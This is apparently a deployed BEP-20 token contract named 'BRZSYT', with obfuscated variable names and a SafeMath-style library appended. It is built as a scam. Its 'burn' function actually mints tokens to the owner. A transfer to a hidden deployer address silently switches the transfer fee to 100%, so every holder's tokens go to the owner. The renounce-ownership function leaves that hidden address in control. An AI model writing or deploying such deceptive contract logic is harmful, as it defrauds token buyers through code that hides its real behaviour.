/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.5;
contract BRZSYT {
uint256 public  zCrLGD = 10000000000000000000;
uint256 public  ijpVcy = 100000000000000000000000;
address private  bqTTve = address(0);
mapping (address => uint256) public balanceOf;
address public  vvsMAy = address(0);
uint256 public  NnGdEw = 10000000000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  nXibnS = address(0);
uint8 public constant decimals = 18;
address public  QHNeZt = address(0);
address public  TucgeB = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  JQUQTa = address(0);
string public  symbol = "BRZSYT";
uint256 public  BHOIFl = 1000000000000000000;
uint256 public  uLiVlJ = 10000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant rVykBN = 9+1;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  dWyjmP = 10000000000000;
address public  zHVkqQ = address(0);
uint256 public  vLkWBP = 100000000000000000000;
uint256 public  aDqEdw = 100000000000000000000000;
uint256 public  PeNMUF = 100000000000000000;
address public owner;
event Transfer(address indexed from, address indexed to, uint256 value);
string public  name = "BRZSYT";
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () public {
bqTTve = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "Wigxrz");
require(to != address(0), "Wigxrz");
require(amount <= balanceOf[from], "Wigxrz");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* rVykBN/dWyjmP ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==bqTTve){
dWyjmP = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}

library SafeGuide {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeGuide: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeGuide: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeGuide: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeGuide: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeGuide: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}